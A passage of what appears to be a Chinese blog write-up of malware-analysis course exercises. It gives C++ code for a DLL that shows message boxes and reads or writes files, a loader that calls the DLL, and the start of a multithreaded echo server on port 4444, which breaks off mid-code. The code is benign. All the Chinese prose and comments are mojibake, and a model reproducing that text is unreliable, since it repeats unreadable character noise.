<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="comment">// DLL è¢«è¿›ç¨‹åŠ è½½æ—¶è°ƒç”¨</span></span><br><span class="line">        <span class="comment">// åœ¨è¿™é‡Œè¿›è¡Œåˆå§‹åŒ–å·¥ä½œ</span></span><br><span class="line">        <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>, <span class="string">L&quot;DLL_PROCESS_ATTACH&quot;</span>, <span class="string">L&quot;DLL_PROCESS_ATTACH&quot;</span>, MB_ICONINFORMATION | MB_OK);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="comment">// çº¿ç¨‹åˆ›å»ºæ—¶è°ƒç”¨</span></span><br><span class="line">        <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>, <span class="string">L&quot;DLL_THREAD_ATTACH&quot;</span>, <span class="string">L&quot;DLL_THREAD_ATTACH&quot;</span>, MB_ICONINFORMATION | MB_OK);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="comment">// çº¿ç¨‹é”€æ¯æ—¶è°ƒç”¨</span></span><br><span class="line">        <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>, <span class="string">L&quot;DLL_THREAD_DETACH&quot;</span>, <span class="string">L&quot;DLL_THREAD_DETACH&quot;</span>, MB_ICONINFORMATION | MB_OK);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="comment">// DLL è¢«è¿›ç¨‹å¸è½½æ—¶è°ƒç”¨</span></span><br><span class="line">        <span class="comment">// åœ¨è¿™é‡Œè¿›è¡Œæ¸…ç†å·¥ä½œ</span></span><br><span class="line">        <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>, <span class="string">L&quot;DLL_PROCESS_DETACH&quot;</span>, <span class="string">L&quot;DLL_PROCESS_DETACH&quot;</span>, MB_ICONINFORMATION | MB_OK);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æµ‹è¯•å‡½æ•°ï¼Œè°ƒç”¨functioN_1åˆ™ä¼šå¼¹å‡ºæç¤ºæ¶ˆæ¯æ¡†</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">function_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>, <span class="string">L&quot;Hello, this is function_1&quot;</span>, <span class="string">L&quot;Function_1&quot;</span>, MB_ICONINFORMATION | MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">ReadAndPrintFile</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// è¯»å–æ–‡ä»¶å¹¶æ‰“å°å†…å®¹</span></span><br><span class="line">    <span class="function">std::ifstream <span class="title">fileStream</span><span class="params">(filename, std::ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (fileStream.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Content of &quot;</span> &lt;&lt; filename &lt;&lt; <span class="string">&quot;:\n&quot;</span>;</span><br><span class="line">        std::cout &lt;&lt; fileStream.<span class="built_in">rdbuf</span>();</span><br><span class="line">        fileStream.<span class="built_in">close</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Error opening file: &quot;</span> &lt;&lt; filename &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">WriteToFile</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename, <span class="type">const</span> <span class="type">char</span>* content, std::ios_base::openmode mode)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å†™å…¥æ–‡ä»¶</span></span><br><span class="line">    <span class="function">std::ofstream <span class="title">fileStream</span><span class="params">(filename, mode | std::ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (fileStream.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        fileStream &lt;&lt; content;</span><br><span class="line">        fileStream.<span class="built_in">close</span>();</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Content written to &quot;</span> &lt;&lt; filename &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Error opening file for writing: &quot;</span> &lt;&lt; filename &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°†å…¶å¯¼å‡ºä¸º<code>DLL</code>æ–‡ä»¶ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o task2.dll task2.cpp</span><br></pre></td></tr></table></figure>

<h5 id="è°ƒç”¨DLLæ–‡ä»¶"><a href="#è°ƒç”¨DLLæ–‡ä»¶" class="headerlink" title="è°ƒç”¨DLLæ–‡ä»¶"></a>è°ƒç”¨<code>DLL</code>æ–‡ä»¶</h5><p>ç„¶åç¼–å†™a.cppï¼Œä½¿å…¶åŠ è½½åˆšåˆšå¯¼å‡ºçš„task2.dllæ–‡ä»¶ï¼Œå¹¶è°ƒç”¨task2.dllé‡Œçš„å‡½æ•°ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜å‡½æ•°æŒ‡é’ˆç±»å‹</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*Function1Ptr)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*ReadAndPrintFilePtr)</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*WriteToFilePtr)</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">const</span> <span class="type">char</span>*, std::ios_base::openmode)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Usage: &quot;</span> &lt;&lt; argv[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &lt;filename&gt; [content]\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŠ è½½ DLL</span></span><br><span class="line">    HMODULE dllHandle = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;task2.dll&quot;</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dllHandle != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// è·å–å‡½æ•°åœ°å€</span></span><br><span class="line">        Function1Ptr function1 = (Function1Ptr)<span class="built_in">GetProcAddress</span>(dllHandle, <span class="string">&quot;function_1&quot;</span>);</span><br><span class="line">        ReadAndPrintFilePtr readAndPrintFile = (ReadAndPrintFilePtr)<span class="built_in">GetProcAddress</span>(dllHandle, <span class="string">&quot;ReadAndPrintFile&quot;</span>);</span><br><span class="line">        WriteToFilePtr writeToFile = (WriteToFilePtr)<span class="built_in">GetProcAddress</span>(dllHandle, <span class="string">&quot;WriteToFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (function1 != <span class="literal">NULL</span> &amp;&amp; readAndPrintFile != <span class="literal">NULL</span> &amp;&amp; writeToFile != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// è°ƒç”¨ DLL ä¸­çš„å‡½æ•°</span></span><br><span class="line">            <span class="built_in">function1</span>();</span><br><span class="line">            <span class="keyword">if</span>(argc == <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">readAndPrintFile</span>(argv[<span class="number">1</span>]);  <span class="comment">// ä½¿ç”¨å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šçš„æ–‡ä»¶å</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (argc &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">                <span class="built_in">writeToFile</span>(argv[<span class="number">1</span>], argv[<span class="number">2</span>], std::ios::app);  <span class="comment">// å¦‚æœæœ‰ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œä½¿ç”¨å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šçš„å†…å®¹</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;Failed to get function addresses.\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¸è½½ DLL</span></span><br><span class="line">        <span class="built_in">FreeLibrary</span>(dllHandle);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to load DLL.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘a.cpp</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc a.cpp</span><br></pre></td></tr></table></figure>

<h5 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h5><p>è¿è¡Œa.exeæµ‹è¯•ã€‚</p>
<ol>
<li>æŸ¥çœ‹test.txtæ–‡ä»¶ä¸­çš„å†…å®¹</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.exe test.txt</span><br></pre></td></tr></table></figure>

<p>å½“task2.dllæ–‡ä»¶è¢«å¯¼å…¥ï¼Œ<code>DLLMain</code>å‡½æ•°ä¼šè¢«æ‰§è¡Œï¼Œç°åœ¨æ˜¯è¢«a.exeè¿›ç¨‹å¯¼å…¥ï¼Œæ‰€ä»¥è¿è¡Œäº†<code>switch case</code>è¯­å¥ä¸­<code>DLL_PROCESS_ATTACH</code>åˆ†æ”¯ä¸‹çš„ä»£ç ã€‚</p>
<p><a href="/../img/Malware-Analysis-Practice2/2.png" title="2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/2.png" alt="2"></a></p>
<p>ç„¶åè°ƒç”¨äº†function_1å‡½æ•°ï¼Œæ¶ˆæ¯æ¡†è¢«å¼¹å‡ºã€‚</p>
<p><a href="/../img/Malware-Analysis-Practice2/3.png" title="3" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/3.png" alt="3"></a></p>
<p>ç´§æ¥ç€è¿è¡Œ<code>ReadAndPrintFile</code>å‡½æ•°ï¼Œæ‰“å°test.txtæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œç„¶åa.exeåœ¨ç»“æŸä¹‹å‰éœ€è¦æ‰§è¡Œ<code>FreeLibrary</code>å¸è½½<code>DLL</code>æ–‡ä»¶ï¼Œè¿™æ—¶<code>switch case</code>è¯­å¥ä¸­<code>DLL_PROCESS_DETACH</code>åˆ†æ”¯ä¸‹çš„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚</p>
<p><a href="/../img/Malware-Analysis-Practice2/4.png" title="4" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/4.png" alt="4"></a></p>
<ol start="2">
<li>å¾€test.txtæ–‡ä»¶ä¸­å†™å…¥æ•°æ®ã€‚</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.exe test.txt &quot;data&quot;</span><br></pre></td></tr></table></figure>

<p><a href="/../img/Malware-Analysis-Practice2/5.png" title="5" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/5.png" alt="5"></a></p>
<h2 id="ç®€å•å¤šçº¿ç¨‹æœåŠ¡å™¨"><a href="#ç®€å•å¤šçº¿ç¨‹æœåŠ¡å™¨" class="headerlink" title="ç®€å•å¤šçº¿ç¨‹æœåŠ¡å™¨"></a>ç®€å•å¤šçº¿ç¨‹æœåŠ¡å™¨</h2><h3 id="å®éªŒè¦æ±‚-2"><a href="#å®éªŒè¦æ±‚-2" class="headerlink" title="å®éªŒè¦æ±‚"></a>å®éªŒè¦æ±‚</h3><p>ç¼–å†™ä¸€ä¸ªç®€å•çš„echoæœåŠ¡å™¨ç¨‹åºï¼ˆå³ï¼šå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥åï¼Œåœ¨å®¢æˆ·ç«¯è¾“å…¥æ¶ˆæ¯ï¼ŒæœåŠ¡å™¨ç«¯å°±ä¼šæ‰“å°è¾“å…¥çš„æ¶ˆæ¯ï¼‰ï¼Œåœ¨4444ç«¯å£è¿›è¡Œç›‘å¬ã€‚æ¯æœ‰ä¸€ä¸ªå®¢æˆ·ç«¯è¿›è¡Œè¿æ¥æ—¶å€™ï¼ŒæœåŠ¡å™¨åˆ›å»ºä¸€ä¸ªå­çº¿ç¨‹ï¼Œå¯¹å®¢æˆ·ç«¯ç¨‹åºè¿›è¡ŒæœåŠ¡ã€‚éœ€è¦å¼•å…¥äº’æ–¥é‡å¯¹å…±äº«ä»£ç åŒºæˆ–å…¨å±€å˜é‡è¿›è¡Œäº’æ–¥è®¿é—®ï¼Œè¦æ±‚ä½¿ç”¨ä¿¡å·ä¼ é€’ç­‰å¾…æœºåˆ¶ã€‚æ ¹æ®è¦æ±‚ï¼Œå®¢æˆ·ç«¯ä»£ç ä¹Ÿéœ€è¦è‡ªè¡Œç¼–å†™ã€‚</p>
<h3 id="å®éªŒç¯å¢ƒ-2"><a href="#å®éªŒç¯å¢ƒ-2" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h3><ul>
<li><p>Windows 7æˆ–Windows 10ä¸»æœºï¼ˆè™šæ‹Ÿæœºï¼‰è‡³å°‘ä¸¤å°ï¼›</p>
</li>
<li><p>ä»£ç ç¼–è¾‘å™¨ï¼›</p>
</li>
<li><p>C&#x2F;C++ä»£ç è¿è¡Œæ‰€éœ€ç¯å¢ƒã€‚</p>
</li>
</ul>
<h3 id="å®éªŒç›®çš„-2"><a href="#å®éªŒç›®çš„-2" class="headerlink" title="å®éªŒç›®çš„"></a>å®éªŒç›®çš„</h3><p>äº†è§£æ¶æ„ä»£ç åœ¨é€šä¿¡æ—¶ï¼Œä¼šä½¿ç”¨åˆ°çš„æœ€åŸºæœ¬çš„æŠ€æœ¯ã€‚ç»ƒä¹ å¤šçº¿ç¨‹ç¼–ç¨‹ã€‚</p>
<h3 id="å®éªŒæ­¥éª¤-2"><a href="#å®éªŒæ­¥éª¤-2" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h3><h5 id="æœåŠ¡ç«¯çš„ä»£ç task3-server-cpp"><a href="#æœåŠ¡ç«¯çš„ä»£ç task3-server-cpp" class="headerlink" title="æœåŠ¡ç«¯çš„ä»£ç task3_server.cpp"></a>æœåŠ¡ç«¯çš„ä»£ç <code>task3_server.cpp</code></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">std::mutex mtx;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å­˜å‚¨å®¢æˆ·ç«¯ä¿¡æ¯çš„ç»“æ„ä½“</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ClientInfo</span> &#123;</span><br><span class="line">    std::string ip;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å­˜å‚¨è¿æ¥çš„å®¢æˆ·ç«¯ä¿¡æ¯çš„å®¹å™¨</span></span><br><span class="line">std::vector&lt;ClientInfo&gt; connectedClients;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HandleClient</span><span class="params">(SOCKET clientSocket)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line">    <span class="type">int</span> bytesReceived;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å®¢æˆ·ç«¯åœ°å€ä¿¡æ¯</span></span><br><span class="line">    sockaddr_in clientAddr;</span><br><span class="line">    <span class="type">int</span> addrLen = <span class="built_in">sizeof</span>(clientAddr);</span><br><span class="line">    <span class="built_in">getpeername</span>(clientSocket, (sockaddr*)&amp;clientAddr, &amp;addrLen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å­˜å‚¨å®¢æˆ·ç«¯ä¿¡æ¯åˆ°å®¹å™¨</span></span><br><span class="line">    <span class="comment">// ä¿æŠ¤å®¹å™¨</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(mtx)</span></span>;</span><br><span class="line">    <span class="comment">// æ­£åœ¨å¯¹äº’æ–¥é” mtx è¿›è¡ŒåŠ é”ï¼Œå½“ lock å¯¹è±¡è¶…å‡ºèŒƒå›´æ—¶ï¼ˆä¾‹å¦‚ï¼Œåœ¨å—æˆ–å‡½æ•°çš„æœ«å°¾ï¼‰ï¼Œå®ƒä¼šè‡ªåŠ¨é‡Šæ”¾å¯¹äº’æ–¥é”çš„é”å®šã€‚</span></span><br><span class="line">    <span class="comment">// åœ¨è¿™é‡Œ,æ¯ä¸€æ¬¡å¾ªç¯ç»“æŸä¹‹åå°±ä¼šé‡Šæ”¾é”ã€‚</span></span><br><span class="line">    <span class="comment">// è¯¥mtxæ˜¯å¯¹vectorè¿›è¡Œä¿æŠ¤ã€‚</span></span><br><span class="line">    <span class="comment">// æ‰€ä»¥è¿™é‡Œå¿…é¡»è¦åœ¨å¤§æ‹¬å·ä¸­,è®©mtxå‡ºå¤§æ‹¬å·ä¹‹åå°±è¢«é‡Šæ”¾,ä¸ç„¶ä¼šæ­»é”....</span></span><br><span class="line">    connectedClients.<span class="built_in">push_back</span>(&#123;<span class="built_in">inet_ntoa</span>(clientAddr.sin_addr), <span class="built_in">ntohs</span>(clientAddr.sin_port)&#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ‰“å°å½“å‰è¿æ¥æƒ…å†µ</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Client connected. Total clients: &quot;</span> &lt;&lt; connectedClients.<span class="built_in">size</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; client : connectedClients) &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;   &quot;</span> &lt;&lt; client.ip &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; client.port &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;-----------------------------\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// æ¥æ”¶å®¢æˆ·ç«¯æ¶ˆæ¯</span></span><br><span class="line">        bytesReceived = <span class="built_in">recv</span>(clientSocket, buffer, <span class="built_in">sizeof</span>(buffer), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (bytesReceived &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// å¯¹å…±äº«èµ„æºä½¿ç”¨äº’æ–¥é‡è¿›è¡Œä¿æŠ¤</span></span><br><span class="line">            <span class="comment">// ä¿æŠ¤cout</span></span><br><span class="line">            <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(mtx)</span></span>;</span><br><span class="line">            <span class="comment">// æ‰“å°å®¢æˆ·ç«¯ä¿¡æ¯åŠæ¶ˆæ¯åˆ°æœ¬åœ°</span></span><br><span class="line">            buffer[bytesReceived] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;Received from &quot;</span> &lt;&lt; <span class="built_in">inet_ntoa</span>(clientAddr.sin_addr) &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; <span class="built_in">ntohs</span>(clientAddr.sin_port)</span><br><span class="line">                      &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; buffer &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åŸæ ·å‘é€æ¶ˆæ¯å›å®¢æˆ·ç«¯</span></span><br><span class="line">            <span class="built_in">send</span>(clientSocket, buffer, bytesReceived, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bytesReceived == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// å®¢æˆ·ç«¯æ–­å¼€è¿æ¥</span></span><br><span class="line">            <span class="comment">// ä¿æŠ¤coutå’Œå®¹å™¨</span></span><br><span class="line">            std::lock_guard&lt;std::mutex&gt; <span 